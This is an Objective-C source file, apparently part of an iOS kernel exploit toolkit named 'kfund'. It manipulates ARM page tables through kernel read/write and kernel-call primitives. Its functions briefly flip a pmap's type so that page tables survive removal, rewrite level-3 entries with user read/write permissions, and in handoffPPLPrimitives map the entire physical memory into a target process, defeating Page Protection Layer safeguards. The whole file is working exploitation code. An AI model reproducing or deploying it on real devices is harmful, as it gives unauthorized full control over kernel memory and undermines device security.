//
//  pmap.m
//  kfund
//
//  Created by Seo Hyun-gyu on 1/3/24.
//

#import <Foundation/Foundation.h>
#import "proc.h"
#import "krw.h"
#import "kcall.h"
#import "offsets.h"

#define PTE_NON_GLOBAL      (1 << 11)
#define PTE_VALID           (1 << 10) // Access flag
#define PTE_OUTER_SHAREABLE (2 << 8)
#define PTE_INNER_SHAREABLE (3 << 8)

#define PTE_LEVEL2_BLOCK    PTE_VALID | (0x0)
#define PTE_LEVEL3_ENTRY    PTE_VALID | 0x3

#define PTE_TO_PERM(pte)  ((((pte) >> 4ULL) & 0xC) | (((pte) >> 52ULL) & 2) | (((pte) >> 54ULL) & 1))
#define _PERM_TO_PTE(perm) ((((perm) & 0xC) << 4ULL) | (((perm) & 2) << 52ULL) | (((perm) & 1) << 54ULL))
#define PERM_TO_PTE(perm) _PERM_TO_PTE((uint64_t) (perm))

#define L2_BLOCK_SIZE 0x2000000
#define L2_BLOCK_MASK (L2_BLOCK_SIZE-1)

#define PERM_KRW_URW 0x7 // R/W for kernel and user
#define FAKE_PHYSPAGE_TO_MAP 0x13370000
#define L2_BLOCK_PAGECOUNT (L2_BLOCK_SIZE / PAGE_SIZE)
#define PPLRW_USER_MAPPING_OFFSET   0x7000000000
#define PPLRW_USER_MAPPING_TTEP_IDX (PPLRW_USER_MAPPING_OFFSET / 0x1000000000)

//https://github.com/apple-oss-distributions/xnu/blob/xnu-8020.140.41/osfmk/vm/vm_map.h#L481C1-L484C65
#define PMAP_TYPE_USER 0 /* ordinary pmap */
#define PMAP_TYPE_KERNEL 1 /* kernel pmap */
#define PMAP_TYPE_COMMPAGE 2 /* commpage pmap */
#define PMAP_TYPE_NESTED 3 /* pmap nested within another pmap */


kern_return_t pmap_enter_options_addr(uint64_t pmap, uint64_t pa, uint64_t va) {
    while (1) {
        kern_return_t kr = (kern_return_t)kcall8(off_pmap_enter_options_addr + get_kslide(), pmap, va, pa, VM_PROT_READ | VM_PROT_WRITE, 0, 0, 1, 1);
        if (kr != KERN_RESOURCE_SHORTAGE) {
            return kr;
        }
        else {
            // On resource shortage, alloc new page
            //pmap_alloc_page_for_ppl(0);
        }
    }
}

void pmap_remove(uint64_t pmap, uint64_t start, uint64_t end) {
    kcall8(off_pmap_remove_options + get_kslide(), pmap, start, end, 0x100, 0, 0, 0, 0);
}

void pmap_set_type(uint64_t pmap_ptr, uint8_t type)
{
    kwrite8(pmap_ptr + off_pmap_type, type);
}

uint64_t pmap_lv2(uint64_t pmap_ptr, uint64_t virt)
{
    uint64_t ttep = kread64(pmap_ptr + off_pmap_ttep);
    
    uint64_t table1Entry = physread64(ttep + ((virt >> 0x21) & 0x38));
    if ((~(table1Entry & 0x3)) == 0) {
        return 0;
    }
    
    uint64_t table2 = table1Entry & 0xFFFFFFFFC000ULL;
    uint64_t table2Entry = physread64(table2 | ((virt >> 0x16) & 0x3ff8));
    
//    uint64_t table1Off   = (virt >> 36ULL) & 0x7ULL;
//    uint64_t table1Entry = physread64(ttep + (8ULL * table1Off));
//    if ((table1Entry & 0x3) != 3) {
//        return 0;
//    }
//    
//    uint64_t table2 = table1Entry & 0xFFFFFFFFC000ULL;
//    uint64_t table2Off = (virt >> 25ULL) & 0x7FFULL;
//    uint64_t table2Entry = physread64(table2 + (8ULL * table2Off));
    
    return table2Entry;
}

int pmap_map_in(uint64_t pmap, uint64_t ua, uint64_t pa, uint64_t size)
{
    uint64_t mappingUaddr = ua & ~L2_BLOCK_MASK;
    uint64_t mappingPA = pa & ~L2_BLOCK_MASK;

    uint64_t endPA = pa + size;
    uint64_t mappingEndPA = endPA & ~L2_BLOCK_MASK;

//    uint64_t l2Count = ((mappingEndPA - mappingPA) / L2_BLOCK_SIZE) + 1;
    uint64_t l2Count = ((mappingEndPA - mappingPA) >> 0x19);
    printf("l2Count: 0x%llx\n", l2Count);

    for (uint64_t i = 0; i < l2Count; i++) {
//        uint64_t curMappingUaddr = mappingUaddr + (i * L2_BLOCK_SIZE);
        uint64_t curMappingUaddr = mappingUaddr + (mappingEndPA - mappingPA) + L2_BLOCK_SIZE;
        kern_return_t kr = pmap_enter_options_addr(pmap, FAKE_PHYSPAGE_TO_MAP, curMappingUaddr);
        if (kr != KERN_SUCCESS) {
            pmap_remove(pmap, mappingUaddr, curMappingUaddr);
            return -7;
        }
    }

    // Temporarily change pmap type to nested
    pmap_set_type(pmap, PMAP_TYPE_NESTED);
    // Remove mapping (table will not be removed because we changed the pmap type)
//    pmap_remove(pmap, mappingUaddr, mappingUaddr + (l2Count * L2_BLOCK_SIZE)); //PANIC
    pmap_remove(pmap, mappingUaddr, mappingUaddr + (mappingEndPA - mappingPA) + L2_BLOCK_SIZE);
    // Change type back
    pmap_set_type(pmap, PMAP_TYPE_USER);

    for (uint64_t i = 0; i < l2Count; i++) {
        uint64_t curMappingUaddr = mappingUaddr + (i * L2_BLOCK_SIZE);
//        uint64_t curMappingUaddr = mappingUaddr + (i << 0x15);
        uint64_t curMappingPA = mappingPA + (i * L2_BLOCK_SIZE);
//        uint64_t curMappingPA = mappingPA + (i << 0x15);

        // Create full table for this mapping
        uint64_t tableToWrite[2048];
        for (int k = 0; k < 2048; k++) {
            uint64_t curMappingPage = curMappingPA + (k * 0x4000);
            if (curMappingPage >= pa || curMappingPage < (pa + size)) {
                tableToWrite[k] = curMappingPage | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
            }
            else {
                tableToWrite[k] = 0;
            }
        }

        // Replace table with the entries we generated
        uint64_t table2Entry = pmap_lv2(pmap, curMappingUaddr);
        if ((table2Entry & 0x3) == 0x3) {
//        if ((~table2Entry & 0x3) != 0) {
            uint64_t table3 = table2Entry & 0xFFFFFFFFC000ULL;
            physwritebuf(table3, tableToWrite, 0x4000);
        }
        else {
            return -6;
        }
    }

    return 0;
}

int handoffPPLPrimitives(pid_t pid) {
    int ret = 0;
    
    uint64_t proc = proc_of_pid(pid);
    if(!proc) return -1;
    
    uint64_t task = kread64(proc + off_p_task);
    if(!task) return -1;
    
    uint64_t vm_map = kread64(task + off_task_map);
    if(!vm_map) return -1;
    
    uint64_t pmap = kread64(vm_map + off_vm_map_pmap);
    if(!pmap) return -1;
    
    uint64_t physBase = kread64(off_gphysbase + get_kslide());
    uint64_t physSize = kread64(off_gphysize + get_kslide());
    
    uint64_t ttep = kread64(pmap + off_pmap_ttep);
//    uint64_t existingLevel1Entry = kread64(pmap_get_ttep(pmap) + (8 * PPLRW_USER_MAPPING_TTEP_IDX));
    uint64_t existingLevel1Entry = physread64(ttep + 8 * ((physBase + PPLRW_USER_MAPPING_OFFSET) >> 0x24));
    if (existingLevel1Entry == 0)
    {
        // Map the entire kernel physical address space into the userland process, starting at PPLRW_USER_MAPPING_OFFSET
        physBase = kread64(off_gphysbase + get_kslide());
        physSize = kread64(off_gphysize + get_kslide());
        ret = pmap_map_in(pmap, physBase+PPLRW_USER_MAPPING_OFFSET, physBase, physSize);
    }
    
    return ret;
}
